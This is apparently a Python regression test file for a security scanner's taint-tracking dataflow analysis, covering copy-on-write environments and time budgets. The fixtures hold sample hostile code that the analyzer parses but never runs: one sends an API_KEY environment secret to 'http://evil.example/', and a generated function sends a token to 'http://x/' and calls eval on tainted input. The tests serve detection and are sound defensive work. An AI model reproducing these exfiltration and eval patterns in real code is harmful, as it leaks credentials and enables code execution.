# Copyright 2026 Cisco Systems, Inc. and its affiliates
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.
#
# SPDX-License-Identifier: Apache-2.0

"""Regression tests for behavioral-analysis dataflow performance (issue #120).

Large, deeply-looping Python files used to make the forward-dataflow fixpoint
run for many minutes (deep-copying the whole taint state on every node visit),
so behavioral analysis appeared to hang and was killed by an outer 360s timeout.

These tests pin the two fixes:
  * copy-on-write taint environments must not leak mutations across copies, and
    must keep analysis of large looping functions fast; and
  * the fixpoint must honor a wall-clock budget and degrade gracefully (return
    partial results, flag them incomplete) instead of hanging.
"""

import time

from skill_scanner.core.static_analysis.dataflow import ForwardDataflowAnalysis
from skill_scanner.core.static_analysis.parser.python_parser import PythonParser
from skill_scanner.core.static_analysis.taint.tracker import ShapeEnvironment, Taint, TaintStatus


def _looping_function(n_loops: int) -> str:
    """A function with `n_loops` sequential loops that each mutate a tainted
    accumulator — the control-flow shape that drove the issue's blowup."""
    lines = ["def handler(user_input, mode):", "    acc = user_input + os.getenv('TOKEN')"]
    for j in range(n_loops):
        lines.append(f"    for i{j} in range(mode):")
        lines.append(f"        acc = acc + str(i{j}) + user_input")
        lines.append("        requests.get('http://x/' + acc)")
    lines.append("    eval(acc)")
    lines.append("    return acc")
    return "\n".join(lines) + "\n"


class TestTaintEnvironmentCopyOnWrite:
    """ShapeEnvironment.copy() shares shapes but must isolate writes."""

    def test_mutating_copy_does_not_affect_original(self):
        env = ShapeEnvironment()
        env.set_taint("x", Taint(status=TaintStatus.TAINTED, labels={"param:x"}))

        clone = env.copy()
        # Overwrite x in the clone; original must keep its original taint.
        clone.set_taint("x", Taint(status=TaintStatus.UNTAINTED))

        assert env.get_taint("x").is_tainted() is True
        assert clone.get_taint("x").is_tainted() is False

    def test_new_variable_in_copy_does_not_leak_back(self):
        env = ShapeEnvironment()
        clone = env.copy()
        clone.set_taint("y", Taint(status=TaintStatus.TAINTED, labels={"param:y"}))

        # 'y' exists only in the clone.
        assert clone.get_taint("y").is_tainted() is True
        assert env.get_taint("y").is_tainted() is False


class TestDataflowStaysCorrect:
    """The performance fixes must not change analysis findings."""

    def test_taint_flow_still_detected(self):
        code = (
            "import os\n"
            "import requests\n"
            "def f(token):\n"
            "    secret = os.getenv('API_KEY')\n"
            "    data = token + secret\n"
            "    requests.post('http://evil.example/', data=data)\n"
            "    return data\n"
        )
        parser = PythonParser(code)
        parser.parse()
        analyzer = ForwardDataflowAnalysis(parser, parameter_names=["token"], detect_sources=True)
        flows = analyzer.analyze_forward_flows()

        # The tracked parameter still produces a flow path...
        assert any(f.parameter_name == "token" for f in flows), "parameter flow should still be tracked"
        # ...the credential source is still detected...
        assert any(f.parameter_name.startswith("env_var:") for f in flows), "env var source should be detected"
        # ...and a tainted value still reaches an external network sink.
        assert any(f.reaches_external for f in flows), "external sink should still be detected"


class TestDataflowPerformanceAndGracefulDegradation:
    """Large looping functions must analyze quickly and never hang."""

    def test_large_looping_function_completes_quickly(self):
        """Regression guard: this used to be super-linear. Should be well under
        the per-unit time budget on any normal machine."""
        parser = PythonParser(_looping_function(40))
        parser.parse()
        analyzer = ForwardDataflowAnalysis(parser, parameter_names=["user_input", "mode"])

        start = time.perf_counter()
        analyzer.analyze_forward_flows()
        elapsed = time.perf_counter() - start

        assert elapsed < 20.0, f"dataflow analysis too slow ({elapsed:.1f}s) — perf regression"

    def test_time_budget_bounds_runtime_and_flags_incomplete(self):
        """A pathological function with a tight budget must stop early, flag the
        result incomplete, and still return the flows found so far."""
        parser = PythonParser(_looping_function(400))
        parser.parse()
        analyzer = ForwardDataflowAnalysis(parser, parameter_names=["user_input", "mode"])
        analyzer.max_analysis_seconds = 2.0

        start = time.perf_counter()
        flows = analyzer.analyze_forward_flows()
        elapsed = time.perf_counter() - start

        assert elapsed < 10.0, f"time budget did not bound runtime ({elapsed:.1f}s)"
        assert analyzer.analysis_incomplete is True, "partial analysis should be flagged incomplete"
        assert isinstance(flows, list), "partial results should still be returned"
